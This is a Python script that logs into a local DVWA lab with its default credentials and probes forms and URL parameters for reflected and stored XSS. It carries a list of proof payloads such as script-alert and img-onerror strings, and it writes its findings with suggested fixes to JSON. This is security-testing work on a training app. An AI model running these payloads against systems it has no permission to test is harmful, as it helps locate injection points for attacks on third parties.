"""
xss_testing.py

Authenticated XSS testing for a single page on DVWA (or similar).
- Logs in (DVWA-style)
- Extracts forms on target_page and tests each form field with XSS payloads
- Tests URL query parameters
- Detects reflected XSS (payload appears unescaped in response)
- Attempts stored XSS detection by submitting payload, then reloading the page
  (best-effort; will not execute JS — detection is via persistence/reflection)
- Saves results to xss_findings.json along with suggested fixes

Outputs:
  - xss_findings.json
"""

import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import json
import copy
import time
import sys
import html

# -------- CONFIG --------
base_host = "http://localhost:8080"
login_page = base_host + "/login.php"
# Change to the page you want to test (examples: /vulnerabilities/xss_r/, /vulnerabilities/xss_s/)
target_page = base_host + "/vulnerabilities/xss_r/"
username = "admin"
password = "password"

# conservative delays
DELAY_BEFORE_RECHECK = 0.5   # seconds to wait before checking for stored payload
# ------------------------

# Common XSS payloads (non-destructive, detect reflection/persistence)
# Avoid heavy scripts; use short payloads that'll reflect visibly.
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "'\"><img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "<iframe srcdoc='<script>alert(1)</script>'></iframe>",
    "<img src=x onerror=console.log('xss')>",
    "';alert(1);//",
    "<body onload=alert(1)>"
]

# Suggested fixes for XSS
def suggested_fixes():
    return {
        "output_encoding": "Encode output contextually (HTML-encode, JS-encode, URL-encode) before rendering user data.",
        "input_validation": "Validate input lengths and types; use allow-lists when possible.",
        "csp": "Use Content Security Policy (CSP) to limit script execution origins and mitigate XSS.",
        "http_only_cookies": "Set HttpOnly and Secure flags on cookies to reduce impact of XSS stealing cookies.",
        "escape_on_output": "Escape data on output rather than trying to sanitize input; libraries/framework helpers help."
    }

# ---------------- Helpers ----------------
def form_action_url(base, action):
    return urljoin(base, action) if action else base

def is_payload_reflected(payload, text):
    """
    Detects naive reflection: payload appears verbatim in the HTML body unescaped.
    Returns:
      - exact_reflection: payload string appears exactly
      - html_escaped_reflection: HTML-escaped payload appears (means app escaped it -> likely safe)
    """
    if text is None:
        return (False, False)
    exact = payload in text
    escaped = html.escape(payload) in text
    return (exact, escaped)

# ---------------- Testing Routines ----------------
def test_form(session, page_url, form):
    """
    Test a form for reflected and stored XSS.
    Returns a list of findings.
    """
    findings = []
    action = form.get("action")
    method = (form.get("method") or "get").lower()
    action_url = form_action_url(page_url, action)
    inputs = form.get("inputs", [])

    # baseline (fill innocuous values)
    baseline_data = {}
    for inp in inputs:
        name = inp.get("name")
        if not name:
            continue
        baseline_data[name] = "test"

    # get baseline response
    try:
        if method == "post":
            base_resp = session.post(action_url, data=baseline_data, timeout=8, allow_redirects=True)
        else:
            base_resp = session.get(action_url, params=baseline_data, timeout=8, allow_redirects=True)
        base_text = base_resp.text if base_resp is not None else ""
    except Exception:
        base_text = ""

    # iterate payloads
    for payload in XSS_PAYLOADS:
        # inject into each field individually and also into ALL_FIELDS
        for target in list(baseline_data.keys()) + ["ALL_FIELDS"]:
            test_data = baseline_data.copy()
            if target == "ALL_FIELDS":
                for k in test_data.keys():
                    test_data[k] = payload
            else:
                if target in test_data:
                    test_data[target] = payload
                else:
                    continue

            # submit payload
            try:
                if method == "post":
                    resp = session.post(action_url, data=test_data, timeout=8, allow_redirects=True)
                else:
                    resp = session.get(action_url, params=test_data, timeout=8, allow_redirects=True)
                test_text = resp.text if resp is not None else ""
            except Exception:
                test_text = ""
                resp = None

            exact_reflect, escaped_reflect = is_payload_reflected(payload, test_text)
            rel_change = (abs(len(test_text or "") - len(base_text or "")) / len(base_text)
                          if base_text and len(base_text) > 0 else (1.0 if test_text else 0.0))

            # record reflected findings (exact reflection = dangerous; escaped reflection = probably safe)
            if exact_reflect or (not exact_reflect and rel_change > 0.25):
                findings.append({
                    "type": "reflected",
                    "action_url": action_url,
                    "method": method,
                    "injected_field": target,
                    "payload": payload,
                    "exact_reflection": exact_reflect,
                    "html_escaped_reflection": escaped_reflect,
                    "rel_length_change": rel_change,
                    "status_code": resp.status_code if resp is not None else None
                })

            # Attempt stored-detection (best-effort):
            # After POSTing the payload, wait shortly and then GET the page that would display stored content.
            # For DVWA stored XSS (xss_s), the same page often shows stored messages — we re-request page_url.
            try:
                time.sleep(DELAY_BEFORE_RECHECK)
                recheck = session.get(page_url, timeout=8, allow_redirects=True)
                recheck_text = recheck.text if recheck is not None else ""
                stored_exact, stored_escaped = is_payload_reflected(payload, recheck_text)
                if stored_exact or stored_escaped:
                    findings.append({
                        "type": "stored",
                        "page_checked": page_url,
                        "action_url": action_url,
                        "method": method,
                        "injected_field": target,
                        "payload": payload,
                        "stored_exact_reflection": stored_exact,
                        "stored_html_escaped_reflection": stored_escaped,
                        "status_code": recheck.status_code if recheck is not None else None
                    })
            except Exception:
                pass

    return findings

def test_url_params(session, url):
    """
    Test URL query parameters for reflected and stored XSS.
    """
    parsed = urlparse(url)
    qs = parse_qs(parsed.query)
    if not qs:
        return []

    findings = []
    try:
        base_resp = session.get(url, timeout=8)
        base_text = base_resp.text if base_resp is not None else ""
    except Exception:
        base_text = ""

    for param in qs.keys():
        for payload in XSS_PAYLOADS:
            test_qs = copy.deepcopy(qs)
            test_qs[param] = [payload]
            new_query = urlencode({k: v[0] for k, v in test_qs.items()})
            new_url = parsed._replace(query=new_query).geturl()

            try:
                resp = session.get(new_url, timeout=8)
                test_text = resp.text if resp is not None else ""
            except Exception:
                test_text = ""
                resp = None

            exact_reflect, escaped_reflect = is_payload_reflected(payload, test_text)
            rel_change = (abs(len(test_text or "") - len(base_text or "")) / len(base_text)
                          if base_text and len(base_text) > 0 else (1.0 if test_text else 0.0))

            if exact_reflect or (not exact_reflect and rel_change > 0.25):
                findings.append({
                    "type": "reflected",
                    "tested_url": new_url,
                    "param": param,
                    "payload": payload,
                    "exact_reflection": exact_reflect,
                    "html_escaped_reflection": escaped_reflect,
                    "rel_length_change": rel_change,
                    "status_code": resp.status_code if resp is not None else None
                })

            # stored: re-request base page and see if payload persists
            try:
                time.sleep(DELAY_BEFORE_RECHECK)
                recheck = session.get(target_page, timeout=8)
                recheck_text = recheck.text if recheck is not None else ""
                stored_exact, stored_escaped = is_payload_reflected(payload, recheck_text)
                if stored_exact or stored_escaped:
                    findings.append({
                        "type": "stored",
                        "page_checked": target_page,
                        "tested_url": new_url,
                        "param": param,
                        "payload": payload,
                        "stored_exact_reflection": stored_exact,
                        "stored_html_escaped_reflection": stored_escaped,
                        "status_code": recheck.status_code if recheck is not None else None
                    })
            except Exception:
                pass

    return findings

# ---------------- Login ----------------
def do_login(session):
    """
    Basic DVWA-style login with hidden-token extraction.
    """
    try:
        r = session.get(login_page, timeout=8)
    except Exception as e:
        print("[!] Cannot reach login page:", e)
        return False

    soup = BeautifulSoup(r.text or "", "html.parser")
    hidden = {}
    form = soup.find("form")
    if form:
        for hid in form.find_all("input", {"type": "hidden"}):
            name = hid.get("name")
            if name:
                hidden[name] = hid.get("value", "")

    payload = {}
    payload.update(hidden)
    payload["username"] = username
    payload["password"] = password
    payload["Login"] = "Login"

    try:
        r2 = session.post(login_page, data=payload, timeout=8, allow_redirects=True)
        if r2 is not None and ("Logout" in r2.text or "DVWA" in r2.text):
            print("[+] Login successful.")
            return True
        else:
            print("[-] Login failed or not detected. Check credentials / login path.")
            return False
    except Exception as e:
        print("[!] Login request failed:", e)
        return False

# ---------------- Main ----------------
if __name__ == "__main__":
    sess = requests.Session()

    if not do_login(sess):
        print("Exiting due to login failure.")
        sys.exit(1)

    # fetch target page HTML and extract forms
    try:
        r = sess.get(target_page, timeout=8)
        html_text = r.text if r is not None else ""
        soup = BeautifulSoup(html_text, "html.parser")
    except Exception as e:
        print("[!] Cannot fetch target page:", e)
        sys.exit(1)

    # build form metadata
    forms = []
    for form_tag in soup.find_all("form"):
        inputs = [{"name": i.get("name"), "type": i.get("type")} for i in form_tag.find_all(['input', 'textarea', 'select'])]
        forms.append({"action": form_tag.get("action"), "method": form_tag.get("method"), "inputs": inputs})

    findings = []
    # test forms
    for f in forms:
        findings.extend(test_form(sess, target_page, f))

    # test URL parameters on the target page
    findings.extend(test_url_params(sess, target_page))

    output = {
        "tested_page": target_page,
        "forms_tested": len(forms),
        "xss_findings": findings,
        "suggested_fixes": suggested_fixes()
    }

    with open("xss_findings.json", "w", encoding="utf-8") as fh:
        json.dump(output, fh, indent=2, ensure_ascii=False)

    print("[+] XSS testing complete.")
    print(f"Forms tested: {len(forms)}, Findings: {len(findings)}")
    print("Results written to xss_findings.json")
